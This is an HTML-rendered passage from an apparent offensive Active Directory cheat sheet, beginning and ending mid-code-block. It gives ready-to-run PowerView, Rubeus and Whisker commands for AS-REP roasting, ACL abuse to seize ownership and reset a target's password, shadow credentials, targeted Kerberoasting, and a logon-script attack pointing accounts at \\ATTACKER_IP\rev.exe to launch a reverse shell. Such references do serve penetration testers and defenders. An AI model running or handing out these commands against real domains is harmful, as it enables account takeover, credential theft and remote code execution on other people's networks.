class="cm-punctuation">{</span><span class="cm-identifier">DoesNotRequirePreAuth</span> <span class="cm-operator">-eq</span> <span class="cm-builtin">$True</span><span class="cm-punctuation">}</span> <span class="cm-operator">-</span><span class="cm-identifier">Properties</span> <span class="cm-identifier">DoesNotRequirePreAuth</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 120px;"></div><div class="CodeMirror-gutters" style="height: 170px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<h4 id="bkmrk-disable-kerberos-pre">Disable Kerberos Preauth</h4>
<p id="bkmrk-with-powerview">With PowerView</p>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 557px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 55px; min-width: 557.095px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Set-DomainObject</span> <span class="cm-operator">-</span><span class="cm-identifier">Identity</span> <span class="cm-identifier">user1</span> <span class="cm-operator">-XOR</span> <span class="cm-punctuation">@{</span><span class="cm-identifier">useraccountcontrol</span><span class="cm-operator">=</span><span class="cm-number">4194304</span><span class="cm-punctuation">}</span> <span class="cm-operator">-</span><span class="cm-identifier">Verbose</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Get-DomainUser</span> <span class="cm-operator">-</span><span class="cm-identifier">KerberosPreuthNotRequired</span> <span class="cm-operator">-</span><span class="cm-identifier">Verbose</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 55px;"></div><div class="CodeMirror-gutters" style="height: 105px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<h4 id="bkmrk-request-as-rep">Request AS-REP</h4>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 970px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 34px; min-width: 969.667px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-punctuation">.\</span><span class="cm-identifier">Rubeus</span><span class="cm-punctuation">.</span><span class="cm-identifier">exe</span> <span class="cm-identifier">asreproast</span> <span class="cm-operator">/</span><span class="cm-identifier">user</span><span class="cm-operator">:&lt;</span><span class="cm-identifier">target</span><span class="cm-operator">&gt;</span> <span class="cm-operator">/</span><span class="cm-identifier">domain</span><span class="cm-operator">:</span><span class="cm-identifier">domain</span><span class="cm-punctuation">.</span><span class="cm-identifier">local</span> <span class="cm-operator">/</span><span class="cm-identifier">creduser</span><span class="cm-operator">:</span><span class="cm-identifier">domain</span><span class="cm-punctuation">.</span><span class="cm-identifier">local</span><span class="cm-punctuation">\</span><span class="cm-identifier">user1</span> <span class="cm-operator">/</span><span class="cm-identifier">credpassword</span><span class="cm-operator">:</span><span class="cm-string">"Password123!"</span> <span class="cm-operator">/</span><span class="cm-identifier">format</span><span class="cm-operator">:</span><span class="cm-identifier">hashcat</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 34px;"></div><div class="CodeMirror-gutters" style="height: 84px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<h4 id="bkmrk-crack-the-hash">Crack the hash</h4>
<p id="bkmrk-with-john-or-hashcat">With <strong>john</strong> or <strong>hashcat</strong> it could be performed</p>
<h3 id="bkmrk-acls-attacks">ACLs Attacks</h3>
<h4 id="bkmrk-acls-packages">ACLs packages</h4>
<ul id="bkmrk-owns-object-writedac"><li>
<strong>Owns object</strong>
<ul><li>WriteDacl</li>
</ul></li>
<li>
<strong>GenericAll</strong>
<ul><li>GenericWrite</li>
<li>AllExtendedRights</li>
<li>WriteOwner</li>
</ul></li>
<li>
<strong>GenericWrite</strong>
<ul><li>Self</li>
<li>WriteProperty</li>
</ul></li>
<li>
<strong>AllExtendedRights</strong>
<ul><li>User-Force-Change-Password</li>
<li>DS-Replication-Get-Changes</li>
<li>DS-Replication-Get-Changes-All</li>
<li>DS-Replication-Get-Changes-In-Filtered-Set</li>
</ul></li>
</ul><h4 id="bkmrk-on-any-objects">On any objects</h4>
<h5 id="bkmrk-writeowner">WriteOwner</h5>
<p id="bkmrk-with-this-rights-on-">With this rights on a user it is possible to become the "owner" (<strong>Grant Ownership</strong>) of the account and then change our ACLs against it</p>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 622px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 142px; min-width: 622.238px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style=""><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Set-DomainObjectOwner</span> <span class="cm-operator">-</span><span class="cm-identifier">Identity</span> <span class="cm-operator">&lt;</span><span class="cm-identifier">target</span><span class="cm-operator">&gt;</span> <span class="cm-operator">-</span><span class="cm-identifier">OwnerIdentity</span> <span class="cm-identifier">user1</span> <span class="cm-operator">-</span><span class="cm-identifier">verbose</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Add-ObjectAcl</span> <span class="cm-operator">-</span><span class="cm-identifier">TargetIdentity</span> <span class="cm-operator">&lt;</span><span class="cm-identifier">target</span><span class="cm-operator">&gt;</span> <span class="cm-operator">-</span><span class="cm-identifier">PrincipalIdentity</span> <span class="cm-identifier">user1</span> <span class="cm-operator">-</span><span class="cm-identifier">Rights</span> <span class="cm-identifier">ResetPassword</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text=""></span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#And change the password</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">5</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable-2">$cred</span> <span class="cm-operator">=</span> <span class="cm-builtin">ConvertTo-SecureString</span> <span class="cm-string">"Password123!"</span> <span class="cm-operator">-</span><span class="cm-identifier">AsPlainText</span> <span class="cm-operator">-</span><span class="cm-identifier">force</span>                  </span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">6</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Set-DomainUserPassword</span> <span class="cm-operator">-</span><span class="cm-identifier">Identity</span> <span class="cm-operator">&lt;</span><span class="cm-identifier">target</span><span class="cm-operator">&gt;</span> <span class="cm-operator">-</span><span class="cm-identifier">accountpassword</span> <span class="cm-variable-2">$cred</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 142px;"></div><div class="CodeMirror-gutters" style="height: 192px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<h5 id="bkmrk-writedacl">WriteDacl</h5>
<p id="bkmrk-with-this-rights-we-">With this rights we can modify our ACLs against the target, and give us <strong>GenericAll</strong> for example</p>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 550px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 34px; min-width: 549.857px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Add-ObjectAcl</span> <span class="cm-operator">-</span><span class="cm-identifier">TargetIdentity</span> <span class="cm-operator">&lt;</span><span class="cm-identifier">target</span><span class="cm-operator">&gt;</span> <span class="cm-operator">-</span><span class="cm-identifier">PrincipalIdentity</span> <span class="cm-identifier">user1</span> <span class="cm-operator">-</span><span class="cm-identifier">Rights</span> <span class="cm-identifier">All</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 34px;"></div><div class="CodeMirror-gutters" style="height: 84px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<h4 id="bkmrk-on-an-user">On an user</h4>
<h5 id="bkmrk-writeproperty">WriteProperty</h5>
<ul id="bkmrk-shadowcredentials"><li>ShadowCredentials</li>
</ul><div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 905px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 34px; min-width: 904.524px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Whisker</span><span class="cm-punctuation">.</span><span class="cm-identifier">exe</span> <span class="cm-identifier">add</span> <span class="cm-operator">/</span><span class="cm-identifier">target</span><span class="cm-operator">:&lt;</span><span class="cm-identifier">target</span><span class="cm-operator">&gt;</span> <span class="cm-operator">/</span><span class="cm-identifier">domain</span><span class="cm-operator">:</span><span class="cm-identifier">domain</span><span class="cm-punctuation">.</span><span class="cm-identifier">local</span> <span class="cm-operator">/</span><span class="cm-identifier">dc</span><span class="cm-operator">:</span><span class="cm-identifier">dc</span><span class="cm-punctuation">.</span><span class="cm-identifier">domain</span><span class="cm-punctuation">.</span><span class="cm-identifier">local</span> <span class="cm-operator">/</span><span class="cm-identifier">path</span><span class="cm-operator">:</span><span class="cm-builtin">C:</span><span class="cm-punctuation">\</span><span class="cm-identifier">path</span><span class="cm-punctuation">\</span><span class="cm-identifier">to</span><span class="cm-punctuation">\</span><span class="cm-identifier">file</span><span class="cm-punctuation">.</span><span class="cm-identifier">pfx</span> <span class="cm-operator">/</span><span class="cm-identifier">password</span><span class="cm-operator">:</span><span class="cm-string">"Password123!"</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 34px;"></div><div class="CodeMirror-gutters" style="height: 84px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<ul id="bkmrk-logon-script"><li>Logon Script</li>
</ul><div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 753px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 120px; min-width: 752.524px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style=""><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#PowerView</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Set-DomainObject</span> <span class="cm-operator">&lt;</span><span class="cm-identifier">target</span><span class="cm-operator">&gt;</span> <span class="cm-operator">-</span><span class="cm-builtin">Set</span> <span class="cm-punctuation">@{</span><span class="cm-string">'mstsinitialprogram'</span><span class="cm-operator">=</span><span class="cm-string">'\\ATTACKER_IP\rev.exe'</span><span class="cm-punctuation">}</span> <span class="cm-operator">-</span><span class="cm-identifier">Verbose</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text=""></span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#AD module</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">5</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Set-ADObject</span> <span class="cm-operator">-</span><span class="cm-identifier">SamAccountName</span> <span class="cm-string">'&lt;target&gt;'</span> <span class="cm-operator">-</span><span class="cm-identifier">PropertyName</span> <span class="cm-identifier">scriptpath</span> <span class="cm-operator">-</span><span class="cm-identifier">PropertyValue</span> <span class="cm-string">"\\ATTACKER_IP\rev.exe"</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 120px;"></div><div class="CodeMirror-gutters" style="height: 170px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<ul id="bkmrk-targeted-kerberoasti"><li>Targeted Kerberoasting</li>
</ul><p id="bkmrk-we-can-then-request-">We can then request a TGS without special privileges. The TGS can then be "<strong>Kerberoasted</strong>".</p>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 673px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 98px; min-width: 672.905px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#Verify if the user already has a SPN</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Get-DomainUser</span> <span class="cm-operator">-</span><span class="cm-identifier">Identity</span> <span class="cm-operator">&lt;</span><span class="cm-identifier">target</span><span class="cm-operator">&gt;</span> <span class="cm-operator">|</span> <span class="cm-builtin">select</span> <span class="cm-identifier">serviceprincipalname</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">    <span class="cm-comment">#Using ActiveDirectory module</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Get-ADUser</span> <span class="cm-operator">-</span><span class="cm-identifier">Identity</span> <span class="cm-operator">&lt;</span><span class="cm-identifier">target</span><span class="cm-operator">&gt;</span> <span class="cm-operator">-</span><span class="cm-identifier">Properties</span> <span class="cm-identifier">ServicePrincipalName</span> <span class="cm-operator">|</span> <span class="cm-builtin">select</span> <span class="cm-identifier">ServicePrincipalName</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 98px;"></div><div class="CodeMirror-gutters" style="height: 148px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<p id="bkmrk-new-spn-must-be-uniq"><strong>New SPN must be unique in the domain</strong></p>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 724px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 228px; min-width: 723.571px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style=""><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#Set the SPN</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Set-DomainObject</span> <span class="cm-operator">-</span><span class="cm-identifier">Identity</span> <span class="cm-identifier">user</span> <span class="cm-operator">-</span><span class="cm-builtin">Set</span> <span class="cm-punctuation">@{</span><span class="cm-identifier">serviceprincipalname</span><span class="cm-operator">=</span><span 